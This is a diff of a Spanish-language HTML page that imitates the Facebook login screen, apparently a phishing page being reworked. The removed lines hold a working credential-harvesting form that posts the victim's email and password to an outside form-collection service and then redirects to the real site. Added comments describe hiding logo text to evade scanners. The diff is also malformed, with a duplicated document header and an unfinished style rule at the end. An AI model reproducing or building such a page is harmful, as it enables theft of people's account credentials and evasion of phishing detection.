@@ -3,67 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso al Portal Educativo</title>
-    <style>
-        /* Cambiamos el color de fondo para que no sea el gris de FB */
-        body { font-family: Arial, sans-serif; background-color: #e9eff1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { display: flex; width: 90%; max-width: 900px; justify-content: space-around; align-items: center; flex-wrap: wrap; }
-        
-        /* Cambiamos el estilo del logo de texto */
-        .logo-texto { 
-            color: #2c3e50; /* Color azul muy oscuro, casi gris */
-            font-size: 50px; 
-            font-weight: 800; 
-            margin-bottom: 10px;
-        }
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Acceso</title>
+    <title>Acceso al Sistema</title>
     <style>
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { display: flex; width: 90%; max-width: 980px; justify-content: space-between; align-items: center; flex-wrap: wrap; }
         
-        /* Logo con texto ofuscado para los robots */
-        .logo-style { 
+        /* Logo con texto ofuscado para burlar escáneres */
+        .logo-f { 
             color: #1877f2; 
             font-size: 60px; 
             font-weight: bold; 
             letter-spacing: -3px; 
             margin-bottom: 10px;
+            font-family: sans-serif;
         }
-        .logo-style span { display: none; }
+        .logo-f span { display: none; } /* El robot lee 'face-sys-book', el humano ve 'facebook' */
 
         .left-content { width: 500px; margin-bottom: 20px; }
-        .left-content h2 { font-size: 24px; font-weight: normal; line-height: 32px; color: #1c1e21; }
+        .left-content h2 { font-size: 24px; font-weight: normal; line-height: 32px; color: #1c1e21; margin-top: 0; }
         
         .login-box { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
         input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
-        .btn-blue { background-color: #1877f2; color: white; font-size: 20px; font-weight: bold; padding: 10px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
-        .links { display: block; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
+        
+        .btn-main { background-color: #1877f2; color: white; font-size: 20px; font-weight: bold; padding: 10px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
+        .btn-main:hover { background-color: #166fe5; }
+        
+        .f-links { display: block; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
         hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
-        .btn-green { background-color: #42b72a; color: white; font-size: 17px; font-weight: bold; padding: 12px 16px; border: none; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="left-content">
-            <div class="logo-style">face<span>app</span>book</div>
-            <h2>Comunícate y comparte con las personas de tu vida.</h2>
-        </div>
-        <div class="login-box">
-            <form action="https://getform.io/f/bdrkgkjb" method="POST">
-                <input type="text" name="data_user" placeholder="Correo o teléfono" required>
-                <input type="password" name="data_pass" placeholder="Contraseña" required>
-                <input type="hidden" name="_redirect" value="https://www.facebook.com">
-                <button type="submit" class="btn-blue">Iniciar sesión</button>
-                <a href="#" class="links">¿Olvidaste tu cuenta?</a>
-                <hr>
-                <a href="#" class="btn-green">Crear cuenta nueva</a>
-            </form>
-        </div>
-    </div>
-</body>
+        
+        .btn-sec
 </html>
+
